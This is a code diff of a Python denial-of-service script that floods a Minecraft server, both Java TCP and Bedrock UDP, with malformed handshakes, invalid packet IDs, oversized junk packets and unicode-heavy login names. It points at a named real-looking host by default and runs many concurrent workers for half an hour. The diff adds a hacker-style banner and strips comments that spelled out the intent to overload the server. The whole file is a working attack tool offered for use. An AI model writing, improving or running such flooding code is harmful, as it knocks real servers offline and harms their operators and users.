@@ -1,4 +1,4 @@
-# combo_load.py — malformed protocol flood
+# combo_load.py — banner + combo flood
 # python 3.12 | stdlib only
 
 import asyncio
@@ -10,6 +10,21 @@ import struct
 import string
 import time
 
+BANNER = r"""
+    ██╗  ██╗ █████╗ ██╗      ██████╗
+    ██║  ██║██╔══██╗██║     ██╔═══██╗
+    ███████║███████║██║     ██║   ██║
+    ██╔══██║██╔══██║██║     ██║   ██║
+    ██║  ██║██║  ██║███████╗╚██████╔╝
+    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝
+
+    ╔═══════════════════════════════════╗
+    ║           By: Mex                 ║
+    ║           absolute olliE          ║
+    ╚═══════════════════════════════════╝
+"""
+
+
 HOST     = os.environ.get("HOST", "business3.astrixhost.web.id")
 PORT     = int(os.environ.get("PORT", "5080"))
 DURATION = int(os.environ.get("DURATION", "1800"))
@@ -19,7 +34,6 @@ SHARD    = os.environ.get("SHARD", "0")
 
 CONNECT_TIMEOUT = 5.0
 
-# protocol version lama (biar ViaBackwards kerja keras konversi)
 PROTO_VERSIONS = [
     47, 107, 108, 109, 110, 210, 315, 335, 338, 340,
     393, 401, 404, 477, 480, 485, 490, 498, 573, 578,
@@ -32,13 +46,12 @@ RAKNET_MAGIC = bytes([
     0xfd, 0xfd, 0xfd, 0xfd, 0x12, 0x34, 0x56, 0x78,
 ])
 
-# unicode panjang biar serialize berat
 UNICODE_CHARS = (
-    "ᚠᚢᚦᚨᚱᚲᚷᚹᚺᚾᛁᛃᛇᛈᛉᛊᛏᛒᛖᛗᛚᛜᛞᛟ"  # runic
-    "अआइईउऊऋएऐओऔकखगघङचछजझञटठडढणतथदधनपफबभम"  # devanagari
-    "アカサタナハマヤラワガザダバパイキシチニヒミリヰギジヂビピ"  # katakana
-    "😀😁😂🤣😃😄😅😆😉😊😋😎😍😘🥰😗"  # emoji
-    "ﬢﬣﬤﬥﬦﬧﬨ﬩שׁשׂשּׁ"  # presentation forms
+    "ᚠᚢᚦᚨᚱᚲᚷᚹᚺᚾᛁᛃᛇᛈᛉᛊᛏᛒᛖᛗᛚᛜᛞᛟ"
+    "अआइईउऊऋएऐओऔकखगघङचछजझञटठडढणतथदधनपफबभम"
+    "アカサタナハマヤラワガザダバパイキシチニヒミリヰギジヂビピ"
+    "😀😁😂🤣😃😄😅😆😉😊😋😎😍😘🥰😗"
+    "ﬢﬣﬤﬥﬦﬧﬨ﬩שׁשׂשּׁ"
 )
 
 
@@ -75,18 +88,13 @@ def random_ascii_name(max_len: int = 16) -> str:
 
 
 def build_handshake(proto_ver: int, state: int) -> bytes:
-    """Handshake dengan protocol version random."""
     p = (vi_write(proto_ver) + pack_string(HOST)
          + struct.pack(">H", PORT) + vi_write(state))
     return pack_packet(0x00, p)
 
 
 def build_login_start(name: str, malformed: bool = False) -> bytes:
-    """Login Start — optional malformed."""
     if malformed:
-        # protocol lama (1.19-) ga punya signature field di login start
-        # tapi kalo server modern → mismatch
-        # kirim dengan field signature kosong / panjang aneh
         body = pack_string(name) + vi_write(random.getrandbits(32))
         return pack_packet(0x00, body)
     return pack_packet(0x00, pack_string(name))
@@ -97,14 +105,12 @@ def build_status_request() -> bytes:
 
 
 def build_invalid_packet(proto_ver: int) -> bytes:
-    """Packet ID acak di luar spec — server ga bisa handle."""
-    pid = random.randint(0x30, 0x7F)  # packet ID yang ga umum
+    pid = random.randint(0x30, 0x7F)
     body = random.randbytes(random.randint(0, 200))
     return pack_packet(pid, body)
 
 
 def build_oversized_packet() -> bytes:
-    """Packet panjang dengan junk data."""
     body = random.randbytes(random.randint(2000, 5000))
     return pack_packet(0x00, body)
 
@@ -145,33 +151,23 @@ STATS = Stats()
 STOP = asyncio.Event()
 
 
-# ============ JAVA MALFORMED WORKER ============
 async def java_malformed_once():
-    """Kirim handshake + login start malformed."""
     try:
         proto = random.choice(PROTO_VERSIONS)
         r, w = await asyncio.wait_for(
             asyncio.open_connection(HOST, PORT), CONNECT_TIMEOUT)
-
-        # handshake dengan protocol version random
-        w.write(build_handshake(proto, 2))  # state=LOGIN
+        w.write(build_handshake(proto, 2))
         await w.drain()
-
-        # login start dengan nama unicode panjang
         if random.random() < 0.5:
             name = random_unicode_name()
         else:
             name = random_ascii_name()
-
         malformed = random.random() < 0.4
         w.write(build_login_start(name, malformed=malformed))
         await w.drain()
-
-        # kadang kirim invalid packet
         if random.random() < 0.3:
             w.write(build_invalid_packet(proto))
             await w.drain()
-
         await asyncio.sleep(random.uniform(0.1, 0.5))
         w.close()
         await STATS.inc_j(ok=1)
@@ -180,12 +176,11 @@ async def java_malformed_once():
 
 
 async def java_oversized_once():
-    """Kirim paket besar biar server alokasi buffer gede."""
     try:
         proto = random.choice(PROTO_VERSIONS)
         r, w = await asyncio.wait_for(
             asyncio.open_connection(HOST, PORT), CONNECT_TIMEOUT)
-        w.write(build_handshake(proto, 1))  # state=STATUS
+        w.write(build_handshake(proto, 1))
         await w.drain()
         w.write(build_oversized_packet())
         await w.drain()
@@ -196,7 +191,6 @@ async def java_oversized_once():
 
 
 async def java_status_once():
-    """Status request normal."""
     try:
         proto = random.choice(PROTO_VERSIONS)
         r, w = await asyncio.wait_for(
@@ -221,7 +215,6 @@ async def java_worker():
             await java_oversized_once()
 
 
-# ============ BEDROCK WORKER ============
 class BedrockWorker:
     def __init__(self):
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -262,9 +255,19 @@ async def reporter():
         print(STATS.snap(), flush=True)
 
 
+def print_banner():
+    print(BANNER)
+    print(f"  target   : {HOST}:{PORT}")
+    print(f"  java     : {CONC_J} workers")
+    print(f"  bedrock  : {CONC_B} workers")
+    print(f"  duration : {DURATION}s")
+    print(f"  shard    : {SHARD}")
+    print("=" * 60)
+    print()
+
+
 async def main():
-    print(f"[shard {SHARD}] target={HOST}:{PORT} "
-          f"J={CONC_J} B={CONC_B} dur={DURATION}s", flush=True)
+    print_banner()
 
     java_tasks = [asyncio.create_task(java_worker()) for _ in range(CONC_J)]
     bedrock_workers = [BedrockWorker() for _ in range(CONC_B)]
